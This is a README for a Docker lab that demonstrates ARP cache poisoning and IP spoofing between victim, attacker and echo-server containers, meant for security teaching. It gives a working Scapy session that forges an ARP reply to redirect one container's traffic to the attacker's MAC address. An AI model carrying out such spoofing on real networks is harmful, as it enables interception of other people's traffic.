# DockerARP-test

# ARP Cache Poisoning & IP Spoofing Lab

This repository contains a minimal lab setup for demoing ARP cache poisoning and IP spoofing.

- [Wikipedia: ARP Spoofing](https://en.wikipedia.org/wiki/ARP_spoofing)
- [Wikipedia: IP Spoofing](https://en.wikipedia.org/wiki/IP_address_spoofing)

> The code contained in this repository is intentionally INSECURE and must NOT be used in production!

## Setup

- Install `docker` and `docker-compose`
- Clone this repo
- Run `docker-compose build` to build the images

You get three images for

- `victim`
- `attacker`
- `udpserv`
  that are used by the containers described in the next section.

After the images are built, run the containers via the command:

```bash
$ docker-compose up -d
[+] Running 0/4
 ⠋ Container alice    Creating
 ⠋ Container evie     Creating
 ⠋ Container bob      Creating
 ⠋ Container udpserv  Creating
 ...
```

> For accessing the containers, refer to the section at the end of this document.

If you need to explicitly rebuild the images use `docker-compose up -d --build`.

## Configuration

There are three containers based on two images

| Name      | IP address  | MAC address       | Role            | Service         |
| --------- | ----------- | ----------------- | --------------- | --------------- |
| `alice`   | 10.10.0.101 | 00:00:00:00:00:01 | Victim          | 80/tcp (http)   |
| `bob`     | 10.10.0.102 | 00:00:00:00:00:02 | Victim          | 80/tcp (http)   |
| `evie`    | 10.10.0.103 | 00:00:00:00:00:03 | Attacker        | -               |
| `udpserv` | 10.10.0.104 | 00:00:00:00:00:04 | UDP Echo Server | 9999/udp (echo) |
## Manual ARP Cache Poisoning

Tell `alice` that the ip address of `bob` resides at `evie's` mac address.

```python
$ scapy
...
>>> a = ARP()                      # create an ARP packet
>>> a.show()                       # have a look at the ARP packet
>>> a.op = 'is-at'                 # Unsolicited ARP
>>> a.pdst = '10.10.0.101'         # L3-Dst: Alice
>>> a.psrc = '10.10.0.102'         # L3-Src: Bob
>>> a.hwdst = '00:00:00:00:00:01'  # L2-Dst: Alice
>>> a.hwsrc = '00:00:00:00:00:03'  # L2-Src: Evie
>>> a.show()                       # check the values again
>>> send(a)                        # send the Packet (on L3, for convenience)
>>> ...
```

During the attack, monitor the system's ARP cache for changes via

```bash
$ watch -d -n1 "ip neigh show"
Every 1.0s: ip neigh show

10.10.0.102 dev eth0 lladdr 00:00:00:00:00:02 REACHABLE
...
```

If the attack was successful you should be able to see the MAC address of `bob's` ip changing to `evie's` MAC address.

> `watch` executes the command `ip neigh show` (show ARP cache) every second (`-n1`) and highlights changes (`-d`).

> Sometimes the ARP cache does not get overwritten immediately - so try another time if there is no success.
